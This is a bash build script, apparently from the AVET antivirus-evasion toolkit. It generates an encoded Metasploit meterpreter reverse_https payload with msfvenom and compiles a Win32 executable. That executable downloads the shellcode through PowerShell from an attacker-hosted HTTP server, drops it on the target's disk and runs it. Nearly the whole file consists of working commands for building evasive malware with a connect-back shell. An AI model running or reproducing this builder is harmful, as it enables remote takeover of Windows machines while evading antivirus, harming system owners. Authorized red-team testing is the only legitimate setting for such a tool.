#!/bin/bash          


#DESCRIPTION_START
# build the .exe file that loads the payload from a given text file
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, encoded with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > output/thepayload.bin

# set shellcode source
set_payload_source download_powershell

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# compile to exe file
$win32_compiler -o output/downloadpsh_revhttps_win32.exe source/avet.c
strip output/downloadpsh_revhttps_win32.exe

# cleanup
cleanup_techniques


echo "
# The generated msf shellcode must be hosted on a HTTP server.
# Call your executable like:
# $ downloadpsh_revhttps_win32.exe http://myserver/thepayload.bin
# The executable will then download the file via powershell and drop it on the target's disk.
# The downloaded shellcode is then read from the file and executed.
"
